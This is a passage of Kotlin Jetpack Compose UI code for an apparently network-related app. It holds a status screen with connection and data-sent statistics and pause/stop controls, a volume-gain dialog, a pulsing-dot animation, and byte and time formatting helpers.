                    Text(method?.title ?: "", color = Color(method?.color ?: 0xFFFFFFFF), fontWeight = FontWeight.Bold)
                    Text(if (isPaused) "PAUSED" else "ACTIVE", color = if (isPaused) NeonOrange else NeonGreen, fontSize = 12.sp)
                }
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        // Stats
        Card(
            modifier = Modifier.fillMaxWidth(),
            colors = CardDefaults.cardColors(containerColor = CardBackground)
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                StatRow("Connections", stats.connections.toString())
                StatRow("Data Sent", formatBytes(stats.dataSent))
                StatRow("Failures", stats.failures.toString())
                StatRow("Elapsed", formatTime(stats.elapsed))
            }
        }

        Spacer(modifier = Modifier.weight(1f))

        // Control buttons
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            Button(
                onClick = { if (isPaused) onResume() else onPause() },
                modifier = Modifier.weight(1f),
                colors = ButtonDefaults.buttonColors(containerColor = if (isPaused) NeonGreen else NeonOrange)
            ) {
                Icon(if (isPaused) Icons.Filled.PlayArrow else Icons.Filled.Pause, null)
                Spacer(modifier = Modifier.width(8.dp))
                Text(if (isPaused) "Resume" else "Pause", color = Color.Black)
            }

            Button(
                onClick = onStop,
                modifier = Modifier.weight(1f),
                colors = ButtonDefaults.buttonColors(containerColor = NeonRed)
            ) {
                Icon(Icons.Filled.Stop, null)
                Spacer(modifier = Modifier.width(8.dp))
                Text("Stop", color = Color.White)
            }
        }
    }
}

@Composable
fun VolumeDialog(
    currentGain: Float,
    onDismiss: () -> Unit,
    onConfirm: (Float) -> Unit
) {
    var gain by remember { mutableStateOf(currentGain) }

    Dialog(onDismissRequest = onDismiss) {
        Card(colors = CardDefaults.cardColors(containerColor = SurfaceGreen)) {
            Column(modifier = Modifier.padding(16.dp)) {
                Text("Audio Settings", color = NeonGreen, fontWeight = FontWeight.Bold, fontSize = 18.sp)

                Spacer(modifier = Modifier.height(16.dp))

                Text("Volume Gain: ${String.format("%.1f", gain)}x", color = Color.White)
                Slider(
                    value = gain,
                    onValueChange = { gain = it },
                    valueRange = 0.5f..4.0f,
                    colors = SliderDefaults.colors(thumbColor = NeonGreen, activeTrackColor = NeonGreen)
                )

                Spacer(modifier = Modifier.height(16.dp))

                Row(horizontalArrangement = Arrangement.End, modifier = Modifier.fillMaxWidth()) {
                    TextButton(onClick = onDismiss) { Text("Cancel", color = Color.White) }
                    Spacer(modifier = Modifier.width(8.dp))
                    Button(onClick = { onConfirm(gain) }, colors = ButtonDefaults.buttonColors(containerColor = NeonGreen)) {
                        Text("Start", color = Color.Black)
                    }
                }
            }
        }
    }
}

@Composable
fun StatRow(label: String, value: String) {
    Row(
        modifier = Modifier
            .fillMaxWidth()
            .padding(vertical = 4.dp),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(label, color = Color.White.copy(alpha = 0.7f))
        Text(value, color = NeonGreen, fontWeight = FontWeight.Bold)
    }
}

@Composable
fun PulsingDot() {
    val infiniteTransition = rememberInfiniteTransition(label = "pulse")
    val scale by infiniteTransition.animateFloat(
        initialValue = 0.8f,
        targetValue = 1.2f,
        animationSpec = infiniteRepeatable(animation = tween(500), repeatMode = RepeatMode.Reverse),
        label = "scale"
    )

    Box(
        modifier = Modifier
            .padding(end = 8.dp)
            .size(12.dp)
            .scale(scale)
            .clip(CircleShape)
            .background(NeonGreen)
    )
}

fun formatBytes(bytes: Long): String = when {
    bytes < 1024 -> "$bytes B"
    bytes < 1024 * 1024 -> "${"%.1f".format(bytes / 1024.0)} KB"
    else -> "${"%.2f".format(bytes / (1024.0 * 1024.0))} MB"
}

fun formatTime(seconds: Int): String {
    val mins = seconds / 60
    val secs = seconds % 60
    return if (mins > 0) "${mins}m ${secs}s" else "${secs}s"
}